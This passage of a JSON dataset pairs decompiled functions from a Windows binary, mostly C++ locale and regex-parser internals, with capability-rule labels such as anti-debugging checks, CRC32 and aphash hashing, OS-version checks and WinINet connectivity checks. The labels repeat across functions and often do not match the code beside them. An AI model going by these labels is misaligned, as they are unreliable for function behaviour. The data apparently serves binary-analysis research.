        "decompiled_code": "\nuint __fastcall fcn.10007dc0(int32_t *param_1)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t unaff_EDI;\n    \n    iVar2 = *param_1;\n    if (iVar2 != param_1[2]) {\n        uVar4 = fcn.10008ec0(iVar2, iVar2 + 2, param_1[0x10] >> 8 & 1);\n        if (uVar4 != 0) {\n            if (unaff_EDI != '\\0') {\n                fcn.10008270();\n            }\n            if (**(param_1[0xf] + 4) == vtable.std::ctype_wchar_t_.0) {\n                uVar3 = fcn.1000a251(*(param_1 + 0x12));\n                uVar3 = uVar3 & 1;\n            }\n            else {\n                uVar3 = (**(**(param_1[0xf] + 4) + 0x10))(1, *(param_1 + 0x12));\n            }\n            iVar2 = param_1[10];\n            fcn.10009330(iVar2, uVar4, unaff_EDI & 0xffffff00 | uVar3);\n            puVar1 = iVar2 + 0x24;\n            *puVar1 = *puVar1 | uVar4;\n            fcn.100067a0();\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 351
    },
    "10009060": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10009060(int16_t **param_1, int16_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int16_t *piVar2;\n    code *pcVar3;\n    uint16_t uVar4;\n    int16_t *piVar5;\n    uint arg_8h;\n    int32_t iVar6;\n    \n    if (param_2 == 0x3a) {\n        arg_8h = 1;\n    }\n    else if (param_2 == 0x3d) {\n        arg_8h = 0;\n    }\n    else {\n        arg_8h = 0xe;\n        if (param_2 == 0x2e) {\n            arg_8h = 0;\n        }\n    }\n    piVar2 = *param_1;\n    iVar6 = 0;\n    piVar5 = param_1[0x13];\n    while ((((piVar5 != 0x3a && (piVar5 = param_1[0x13],  piVar5 != 0x3d)) && (piVar5 != 0x2e)) &&\n           (piVar5 != 0xffffffff))) {\n        piVar5 = *param_1;\n        if (piVar5 != param_1[2]) {\n            if (((*piVar5 == 0x5c) && (piVar5 = piVar5 + 1,  piVar5 != param_1[2])) &&\n               ((((param_1[0x14] & 8) == 0 && ((*piVar5 == 0x28 || (*piVar5 == 0x29)))) ||\n                (((param_1[0x14] & 0x10) == 0 && ((*piVar5 == 0x7b || (*piVar5 == 0x7d)))))))) {\n                *param_1 = piVar5;\n            }\n            *param_1 = *param_1 + 1;\n        }\n        fcn.100054a0();\n        iVar6 = iVar6 + 1;\n        piVar5 = param_1[0x13];\n    }\n    if (param_1[0x13] == param_2) {\n        if (param_2 == 0x3a) {\n            uVar4 = fcn.10008ec0(piVar2, *param_1, param_1[0x10] >> 8 & 1);\n            if (uVar4 != 0) {\n                piVar2 = param_1[10];\n                fcn.10009330(piVar2, uVar4, 0);\n                puVar1 = piVar2 + 0x12;\n                *puVar1 = *puVar1 | uVar4;\n                goto code_r0x10009172;\n            }\n            goto code_r0x10009190;\n        }\n        if (param_2 != 0x3d) {\n            if (param_2 != 0x2e) {\ncode_r0x10009172:\n                fcn.100067a0();\n                fcn.10007660(0x5d, arg_8h);\n                return;\n            }\n            if (piVar2 != *param_1) {\n                fcn.10009610(piVar2, *param_1, iVar6, param_1[10] + 10);\n                goto code_r0x10009172;\n            }\n            goto code_r0x1000919e;\n        }\n        if (piVar2 != *param_1) {\n            fcn.100093a0(piVar2, *param_1, iVar6);\n            goto code_r0x10009172;\n        }\n    }\n    else {\n        fcn.1000a231(arg_8h);\ncode_r0x10009190:\n        fcn.1000a231(1);\n    }\n    fcn.1000a231(0);\ncode_r0x1000919e:\n    fcn.1000a231(0);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 905
    },
    "10009230": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\nuint8_t __fastcall fcn.10009230(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_1 + 0x50);\n    if ((uVar1 & 0x400000) != 0) {\n    // switch table (52 cases) at 0x10009284\n        switch(*(param_1 + 0x48)) {\n        case 0x44:\n        case 0x53:\n        case 0x57:\n        case 99:\n        case 100:\n        case 0x73:\n        case 0x77:\n            goto code_r0x10009280;\n        default:\ncode_r0x10009255:\n            return 1;\n        }\n    }\n    // switch table (92 cases) at 0x100092c0\n    switch(*(param_1 + 0x48)) {\n    case 0x22:\n    case 0x2f:\n        return uVar1 >> 0x18 & 1;\n    default:\ncode_r0x10009280:\n        return 0;\n    case 0x24:\n    case 0x2a:\n    case 0x2e:\n    case 0x5b:\n    case 0x5c:\n    case 0x5e:\n    case 0x7c:\n        goto code_r0x10009255;\n    case 0x28:\n    case 0x29:\n    case 0x2b:\n    case 0x3f:\n    case 0x7b:\n    case 0x7d:\n        return uVar1 >> 0x17 & 1;\n    }\n}\n",
        "token_count": 369
    },
    "10013c73": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.10013c73(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.1000b9d0(0x1003ec18, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.10010e96();\n        *puVar1 = 0;\n        puVar1 = fcn.10010ea9();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x10041a08)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x10041808) + 0x28 + iVar3) & 1) != 0) {\n                fcn.10014f63(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x10041808) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.10010ea9();\n                    *puVar1 = 9;\n                    puVar1 = fcn.10010e96();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.10013d65(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.10013d32();\n                goto code_r0x10013d55;\n            }\n        }\n        puVar1 = fcn.10010e96();\n        *puVar1 = 0;\n        puVar1 = fcn.10010ea9();\n        *puVar1 = 9;\n        fcn.10010dcf();\n    }\n    uVar2 = 0xffffffff;\ncode_r0x10013d55:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 670
    },
    "100015a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.100015a0(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a7bf;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        fcn.1000ac95(0x44);\n        var_4h = 0;\n        iVar3 = *(arg_ch + 4);\n        if (iVar3 == 0) {\n            arg_8h_00 = 0x100372e0;\n        }\n        else {\n            arg_8h_00 = *(iVar3 + 0x18);\n            if (arg_8h_00 == 0) {\n                arg_8h_00 = iVar3 + 0x1c;\n            }\n        }\n        uVar2 = fcn.10001160(arg_8h_00);\n        iVar3 = fcn.10001540(uVar2, 0, arg_8h_00, uVar1);\n        *arg_8h = iVar3;\n        fcn.10001240();\n    }\n    *in_FS_OFFSET = var_ch;\n    return 2;\n}\n",
        "token_count": 382
    },
    "10003280": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.10003280(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint32_t uVar4;\n    uint uVar5;\n    code *var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a8c8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.10009b56(0);\n    piVar1 = *0x10054750;\n    var_4h = 0;\n    var_14h = *0x10054750;\n    if (*0x10054754 == 0) {\n        uVar4 = *0x10054754;\n        fcn.10009b56(0);\n        if (*0x10054754 == 0) {\n            *0x10040ea8 = *0x10040ea8 + 1;\n            *0x10054754 = *0x10040ea8;\n        }\n        fcn.10009bae(uVar4, uVar5, uVar2);\n    }\n    uVar2 = *0x10054754;\n    iVar3 = *(arg_8h + 4);\n    if (*0x10054754 < *(iVar3 + 0xc)) {\n        arg_8h_00 = *(*(iVar3 + 8) + *0x10054754 * 4);\n        if (arg_8h_00 != NULL) goto code_r0x1000339a;\n    }\n    else {\n        arg_8h_00 = NULL;\n    }\n    if (*(iVar3 + 0x14) == '\\0') {\ncode_r0x1000332e:\n        if (arg_8h_00 != NULL) goto code_r0x1000339a;\n    }\n    else {\n        iVar3 = fcn.10009d95();\n        if (uVar2 < *(iVar3 + 0xc)) {\n            arg_8h_00 = *(*(iVar3 + 8) + uVar2 * 4);\n            goto code_r0x1000332e;\n        }\n    }\n    arg_8h_00 = piVar1;\n    if (piVar1 == NULL) {\n        iVar3 = fcn.10003710(&var_14h, arg_8h);\n        if (iVar3 == -1) {\n            var_28h = vtable.std::bad_cast.0;\n            _var_24h = 0x100372c4;\n            fcn.1000da34(&var_28h, 0x1003ef54);\n        }\n        arg_8h_00 = var_14h;\n        *0x10054750 = var_14h;\n        if (*(*var_14h + 4) == method.std::locale::_Locimp.virtual_4) {\n            LOCK();\n            var_14h[1] = var_14h[1] + 1;\n        }\n        else {\n            (**(*var_14h + 4))();\n        }\n        fcn.10009d67(arg_8h_00);\n    }\ncode_r0x1000339a:\n    fcn.10009bae();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 857
    },
    "100033c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __cdecl fcn.100033c0(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint32_t uVar4;\n    uint uVar5;\n    code *var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a8c8;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.10009b56(0);\n    piVar1 = *0x1005474c;\n    var_4h = 0;\n    var_14h = *0x1005474c;\n    if (*0x10040ec4 == 0) {\n        uVar4 = *0x10040ec4;\n        fcn.10009b56(0);\n        if (*0x10040ec4 == 0) {\n            *0x10040ea8 = *0x10040ea8 + 1;\n            *0x10040ec4 = *0x10040ea8;\n        }\n        fcn.10009bae(uVar4, uVar5, uVar2);\n    }\n    uVar2 = *0x10040ec4;\n    iVar3 = *(arg_8h + 4);\n    if (*0x10040ec4 < *(iVar3 + 0xc)) {\n        arg_8h_00 = *(*(iVar3 + 8) + *0x10040ec4 * 4);\n        if (arg_8h_00 != NULL) goto code_r0x100034da;\n    }\n    else {\n        arg_8h_00 = NULL;\n    }\n    if (*(iVar3 + 0x14) == '\\0') {\ncode_r0x1000346e:\n        if (arg_8h_00 != NULL) goto code_r0x100034da;\n    }\n    else {\n        iVar3 = fcn.10009d95();\n        if (uVar2 < *(iVar3 + 0xc)) {\n            arg_8h_00 = *(*(iVar3 + 8) + uVar2 * 4);\n            goto code_r0x1000346e;\n        }\n    }\n    arg_8h_00 = piVar1;\n    if (piVar1 == NULL) {\n        iVar3 = fcn.100015a0(&var_14h, arg_8h);\n        if (iVar3 == -1) {\n            var_28h = vtable.std::bad_cast.0;\n            _var_24h = 0x100372c4;\n            fcn.1000da34(&var_28h, 0x1003ef54);\n        }\n        arg_8h_00 = var_14h;\n        *0x1005474c = var_14h;\n        if (*(*var_14h + 4) == method.std::locale::_Locimp.virtual_4) {\n            LOCK();\n            var_14h[1] = var_14h[1] + 1;\n        }\n        else {\n            (**(*var_14h + 4))();\n        }\n        fcn.10009d67(arg_8h_00);\n    }\ncode_r0x100034da:\n    fcn.10009bae();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 866
    },
    "10003710": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.10003710(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    code **ppcVar2;\n    uint *arg_8h_00;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    ulong uVar3;\n    uint *arg_8h_01;\n    uint var_64h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002a958;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = uVar1;\n    if ((arg_8h != NULL) && (*arg_8h == 0)) {\n        ppcVar2 = fcn.1000ac95(0x10);\n        arg_8h_01 = &var_28h;\n        var_4h = 0;\n        arg_8h_00 = fcn.100013f0(arg_8h_01);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        if (0xf < arg_8h_00[5]) {\n            arg_8h_00 = *arg_8h_00;\n        }\n        fcn.10001160(arg_8h_00);\n        ppcVar2[1] = NULL;\n        *ppcVar2 = vtable.std::collate_wchar_t_.0;\n        uVar3 = fcn.1000a361(arg_8h_00, arg_8h_01, uVar1);\n        ppcVar2[2] = uVar3;\n        ppcVar2[3] = uVar3 >> 0x20;\n        *arg_8h = ppcVar2;\n        fcn.10001240();\n        fcn.100021d0();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.1000ac84(unaff_ESI);\n    return;\n}\n",
        "token_count": 520
    },
    "10005fd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.10005fd0(int32_t **arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    char cVar3;\n    uint32_t uVar4;\n    int32_t **in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint32_t extraout_ECX_05;\n    uint32_t extraout_ECX_06;\n    uint32_t extraout_ECX_07;\n    uint32_t extraout_ECX_08;\n    uint32_t extraout_ECX_09;\n    uint32_t extraout_ECX_10;\n    uint32_t extraout_ECX_11;\n    uint32_t extraout_ECX_12;\n    uint32_t extraout_ECX_13;\n    int32_t **ppiVar5;\n    uint32_t uVar6;\n    int32_t **ppiVar7;\n    int32_t *in_FS_OFFSET;\n    int32_t *var_54h;\n    uint32_t var_50h;\n    int32_t var_48h;\n    int32_t *var_44h;\n    uint32_t var_40h;\n    int32_t var_38h;\n    int32_t **var_34h;\n    uint32_t var_30h;\n    int32_t var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    int32_t var_18h;\n    int32_t **var_14h;\n    int32_t **var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002aa70;\n    var_ch = *in_FS_OFFSET;\n    uVar4 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_34h = *in_ECX;\n    ppiVar5 = in_ECX + 1;\n    var_10h = in_ECX;\n    fcn.10005f40(ppiVar5, uVar4);\n    var_24h = in_ECX[4];\n    var_14h = in_ECX + 5;\n    var_4h = 0;\n    uVar4 = fcn.10007150(var_14h);\n    var_4h = 1;\n    if (arg_8h != NULL) {\n        do {\n            *in_ECX = var_34h;\n            in_ECX[4] = var_24h;\n            fcn.10005e50(&var_30h);\n            fcn.10005d20(&var_20h);\n            uVar4 = fcn.10005050(arg_8h[3]);\n            if (uVar4 != '\\0') goto code_r0x10006094;\n            arg_8h = arg_8h[6];\n        } while (arg_8h != NULL);\n    }\n    ppiVar5 = ppiVar5 & 0xffffff00;\n    do {\n        if (var_20h == 0) {\ncode_r0x10006278:\n            if (var_30h != 0) {\n                uVar4 = var_28h - var_30h >> 2;\n                if (0x3fffffff < uVar4) {\n                    uVar4 = fcn.10010ddf();\n                    var_30h = extraout_ECX_10;\n                }\n                if (0xfff < uVar4 << 2) {\n                    uVar4 = var_30h;\n                    if ((var_30h & 0x1f) != 0) {\n                        fcn.10010ddf();\n                        uVar4 = extraout_ECX_11;\n                    }\n                    var_30h = *(uVar4 - 4);\n                    if (uVar4 <= var_30h) {\n                        var_30h = fcn.10010ddf();\n                        uVar4 = extraout_ECX_12;\n                    }\n                    uVar4 = uVar4 - var_30h;\n                    if (uVar4 < 4) {\n                        var_30h = fcn.10010ddf();\n                        uVar4 = extraout_ECX_13;\n                    }\n                    if (0x23 < uVar4) {\n                        var_30h = fcn.10010ddf();\n                    }\n                }\n                uVar4 = fcn.1000acc8(var_30h);\n            }\n            *in_FS_OFFSET = var_ch;\n            return uVar4 & 0xffffff00 | ppiVar5 & 0xff;\n        }\n        uVar4 = var_18h - var_20h >> 3;\n        if (uVar4 < 0x20000000) {\n            if (0xfff < uVar4 << 3) {\n                uVar4 = var_20h;\n                if ((var_20h & 0x1f) != 0) {\n                    fcn.10010ddf();\n                    uVar4 = extraout_ECX_07;\n                }\n                var_20h = *(uVar4 - 4);\n                if (uVar4 <= var_20h) {\n                    var_20h = fcn.10010ddf();\n                    uVar4 = extraout_ECX_08;\n                }\n                uVar4 = uVar4 - var_20h;\n                if (uVar4 < 4) {\n                    var_20h = fcn.10010ddf();\n                    uVar4 = extraout_ECX_09;\n                }\n                if (0x23 < uVar4) {\n                    var_20h = fcn.10010ddf();\n                }\n            }\n            uVar4 = fcn.1000acc8(var_20h);\n            goto code_r0x10006278;\n        }\n        uVar4 = fcn.10010ddf();\ncode_r0x10006094:\n        if (*(in_ECX + 0x1b) == '\\0') {\n            ppiVar5 = CONCAT31(ppiVar5 >> 8, 1);\n        }\n        else {\n            var_54h = *in_ECX;\n            fcn.10005f40(ppiVar5);\n            var_44h = ppiVar5[3];\n            ppiVar5 = in_ECX + 5;\n            var_4h._0_1_ = 2;\n            fcn.10007150();\n            var_4h = CONCAT31(var_4h._1_3_, 3);\n            piVar1 = arg_8h[6];\n            uVar4 = *in_ECX - var_34h >> 1;\n            in_ECX = var_34h;\n            ppiVar7 = var_10h;\n            for (; piVar1 != NULL; piVar1 = piVar1[6]) {\n                *ppiVar7 = in_ECX;\n                ppiVar7[4] = var_24h;\n                fcn.10005e50(&var_30h, ppiVar5);\n                fcn.10005d20(&var_20h);\n                ppiVar5 = piVar1[3];\n                cVar3 = fcn.10005050(ppiVar5);\n                in_ECX = var_34h;\n                arg_8h = uVar4;\n                if (cVar3 != '\\0') {\n                    piVar2 = *ppiVar7;\n                    uVar6 = piVar2 - var_34h >> 1;\n                    ppiVar7 = var_10h;\n                    if (uVar4 < uVar6) {\n                        var_44h = var_10h[4];\n                        fcn.10005e50(var_10h + 1);\n                        fcn.10005d20(var_14h);\n                        ppiVar7 = var_10h;\n                        arg_8h = uVar6;\n                        var_54h = piVar2;\n                    }\n                }\n                uVar4 = arg_8h;\n                arg_8h = ppiVar7;\n            }\n            *var_10h = var_54h;\n            var_10h[4] = var_44h;\n            fcn.10005e50(&var_50h, ppiVar5);\n            uVar4 = fcn.10005d20(&var_40h);\n            ppiVar5 = 0x1;\n            if (var_40h != 0) {\n                uVar6 = var_38h - var_40h >> 3;\n                uVar4 = var_40h;\n                if (0x1fffffff < uVar6) {\n                    uVar6 = fcn.10010ddf();\n                    uVar4 = extraout_ECX;\n                }\n                if (0xfff < uVar6 << 3) {\n                    uVar6 = uVar4;\n                    if ((uVar4 & 0x1f) != 0) {\n                        fcn.10010ddf();\n                        uVar6 = extraout_ECX_00;\n                    }\n                    uVar4 = *(uVar6 - 4);\n                    if (uVar6 <= uVar4) {\n                        uVar4 = fcn.10010ddf();\n                        uVar6 = extraout_ECX_01;\n                    }\n                    uVar6 = uVar6 - uVar4;\n                    if (uVar6 < 4) {\n                        uVar4 = fcn.10010ddf();\n                        uVar6 = extraout_ECX_02;\n                    }\n                    if (0x23 < uVar6) {\n                        uVar4 = fcn.10010ddf();\n                    }\n                }\n                uVar4 = fcn.1000acc8(uVar4);\n            }\n            if (var_50h != 0) {\n                uVar6 = var_48h - var_50h >> 2;\n                uVar4 = var_50h;\n                if (0x3fffffff < uVar6) {\n                    uVar6 = fcn.10010ddf();\n                    uVar4 = extraout_ECX_03;\n                }\n                if (0xfff < uVar6 << 2) {\n                    uVar6 = uVar4;\n                    if ((uVar4 & 0x1f) != 0) {\n                        fcn.10010ddf();\n                        uVar6 = extraout_ECX_04;\n                    }\n                    uVar4 = *(uVar6 - 4);\n                    if (uVar6 <= uVar4) {\n                        uVar4 = fcn.10010ddf();\n                        uVar6 = extraout_ECX_05;\n                    }\n                    uVar6 = uVar6 - uVar4;\n                    if (uVar6 < 4) {\n                        uVar4 = fcn.10010ddf();\n                        uVar6 = extraout_ECX_06;\n                    }\n                    if (0x23 < uVar6) {\n                        uVar4 = fcn.10010ddf();\n                    }\n                }\n                uVar4 = fcn.1000acc8(uVar4);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 2491
    },
    "100062f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.100062f0(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    char cVar4;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h_00;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002aaa0;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    if (*(arg_8h + 0x24) == 1) {\n        uVar2 = fcn.100072d0(arg_8h, arg_ch);\n        *in_FS_OFFSET = var_ch;\n        return uVar2;\n    }\n    var_3ch = *in_ECX;\n    fcn.10005f40(in_ECX + 1, uVar2);\n    var_2ch = in_ECX[4];\n    var_4h = 0;\n    fcn.10007150(in_ECX + 5);\n    var_4h = 1;\n    var_14h = in_ECX[0x10] + *(arg_8h + 0x20) * 8;\n    var_1ch = *var_14h;\n    var_18h = var_14h[1];\n    var_10h = *in_ECX;\n    if ((arg_10h == 0) || (*var_18h != var_10h)) {\n        uVar2 = 0x100;\n    }\n    else {\n        uVar2 = 0;\n    }\n    if ((*(arg_8h + 0x18) < 0) || (arg_10h < *(arg_8h + 0x18))) {\n        cVar4 = uVar2 >> 8;\n        if (arg_10h < *(arg_8h + 0x14)) {\n            if (cVar4 == '\\0') goto code_r0x10006454;\n            *var_14h = arg_10h + 1;\n            var_14h[1] = &var_10h;\n            arg_8h_00 = *(arg_8h + 0xc);\n            goto code_r0x1000645a;\n        }\n        if (arg_ch != '\\0') {\n            if (cVar4 == '\\0') {\n                if (1 < arg_10h) goto code_r0x10006467;\n            }\n            else {\n                *var_14h = arg_10h + 1;\n                var_14h[1] = &var_10h;\n                uVar1 = fcn.10005050(*(arg_8h + 0xc));\n                uVar2 = uVar1;\n                if (uVar1 != 0) goto code_r0x1000648a;\n            }\n            *var_14h = var_1ch;\n            var_14h[1] = var_18h;\n            fcn.10005ce0();\n            goto code_r0x10006454;\n        }\n        arg_8h_00 = *(*(arg_8h + 0x1c) + 0xc);\n        uVar1 = fcn.10005050(arg_8h_00);\n        uVar2 = uVar1;\n        if (uVar1 != 0) goto code_r0x1000648a;\n        if (cVar4 != '\\0') {\n            fcn.10005ce0(&var_3ch);\n            *var_14h = arg_10h + 1;\n            var_14h[1] = &var_10h;\n            goto code_r0x1000645a;\n        }\n    }\n    else {\ncode_r0x10006454:\n        arg_8h_00 = *(*(arg_8h + 0x1c) + 0xc);\ncode_r0x1000645a:\n        uVar1 = fcn.10005050(arg_8h_00);\n        uVar2 = uVar1;\n        if (uVar1 != 0) goto code_r0x1000648a;\n    }\ncode_r0x10006467:\n    *in_ECX = var_3ch;\n    in_ECX[4] = var_2ch;\n    fcn.10005e50(&var_38h);\n    fcn.10005d20(&var_28h);\ncode_r0x1000648a:\n    *var_14h = var_1ch;\n    var_14h[1] = var_18h;\n    fcn.100037e0();\n    uVar3 = fcn.10003a70();\n    *in_FS_OFFSET = var_ch;\n    return uVar3 & 0xffffff00 | uVar2 & 0xff;\n}\n",
        "token_count": 1193
    },
    "100067f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.100067f0(int16_t **param_1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int16_t *in_EAX;\n    code **ppcVar3;\n    int16_t *piVar4;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    \n    uVar7 = 0;\n    uVar6 = 0;\n    piVar4 = param_1[0x13];\n    while( true ) {\n        if ((piVar4 == 0xffffffff) || (in_EAX = param_1[0x13],  uVar6 = uVar7,  in_EAX == 0x7c)) goto code_r0x10006a4c;\n        if (in_EAX == 0x29) break;\ncode_r0x10006829:\n        if (in_EAX == 0x2e) {\n            ppcVar3 = fcn.1000ac95(0x14);\n            ppcVar3[4] = NULL;\n            *ppcVar3 = vtable.std::_Node_base.0;\n            ppcVar3[1] = 0x5;\n            ppcVar3[2] = NULL;\n            ppcVar3[3] = NULL;\n            ppcVar3[4] = param_1[10];\n            if (*(param_1[10] + 6) != NULL) {\n                ppcVar3[3] = *(param_1[10] + 6);\n                *(*(param_1[10] + 6) + 0x10) = ppcVar3;\n            }\n            *(param_1[10] + 6) = ppcVar3;\n            param_1[10] = ppcVar3;\n            piVar4 = *param_1;\n            if (piVar4 != param_1[2]) {\n                if (((*piVar4 == 0x5c) && (piVar4 = piVar4 + 1,  piVar4 != param_1[2])) &&\n                   ((((param_1[0x14] & 8) 